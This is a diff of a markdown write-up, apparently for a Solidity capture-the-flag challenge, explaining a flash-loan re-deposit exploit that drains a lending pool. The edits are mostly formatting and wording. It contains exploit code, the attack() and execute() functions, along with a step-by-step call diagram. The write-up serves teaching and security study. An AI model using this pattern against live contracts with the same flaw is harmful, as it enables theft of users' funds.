@@ -16,7 +16,9 @@ The check only verifies that `address(this).balance` has not decreased — it do
 
 ```solidity
 function deposit() external payable {
-    unchecked { balances[msg.sender] += msg.value; }
+    unchecked {
+        balances[msg.sender] += msg.value;
+    }
     emit Deposit(msg.sender, msg.value);
 }
 ```
@@ -42,16 +44,16 @@ Three functions on the exploit contract execute the full attack atomically:
 **`attack()`** — orchestrates the sequence:
 ```solidity
 function attack(uint256 amount) external payable {
-    pool.flashLoan(amount);   // Step 1: borrow all 1000 ETH
-    pool.withdraw();          // Step 3: pull out deposited ETH
-    payable(recovery).transfer(address(this).balance); // Step 4: send to recovery
+    pool.flashLoan(amount);                                    // Step 1: borrow all 1000 ETH
+    pool.withdraw();                                           // Step 3: pull out deposited ETH
+    payable(recovery).transfer(address(this).balance);         // Step 4: send full balance to recovery
 }
 ```
 
 **`execute()`** — the flash loan callback, called by the pool mid-loan:
 ```solidity
 function execute() external payable {
-    pool.deposit{value: msg.value}(); // Step 2: re-deposit borrowed ETH
+    pool.deposit{value: msg.value}();  // Step 2: re-deposit borrowed ETH
 }
 ```
 
@@ -71,13 +73,14 @@ exploit.attack(1000 ETH)
     ├─> pool.withdraw()
     │       └─ sends balances[exploit] = 1000 ETH back to exploit
     │
-    └─> recovery.transfer(1000 ETH)
+    └─> recovery.transfer(address(this).balance)
+            └─ full ETH balance of exploit contract sent to recovery
 ```
 
 - **Step 1** — `flashLoan(1000 ETH)` sends all pool ETH to the exploit contract and triggers `execute()`
 - **Step 2** — inside `execute()`, the borrowed ETH is deposited back via `deposit()` — pool's raw balance returns to 1000 ETH, passing the repayment check, and `balances[exploit]` is now credited 1000 ETH
-- **Step 3** — after the flash loan returns, `withdraw()` pays out `balances[exploit]` — the pool sends 1000 ETH back to the exploit contract
-- **Step 4** — `recovery.transfer()` forwards all ETH to the recovery address
+- **Step 3** — after the flash loan returns, `withdraw()` pays out `balances[exploit]` — the pool sends 1000 ETH back to the exploit contract via `SafeTransferLib.safeTransferETH`
+- **Step 4** — `recovery.transfer(address(this).balance)` forwards the exploit contract's entire ETH balance to the recovery address
 
 ### Why It Works
 
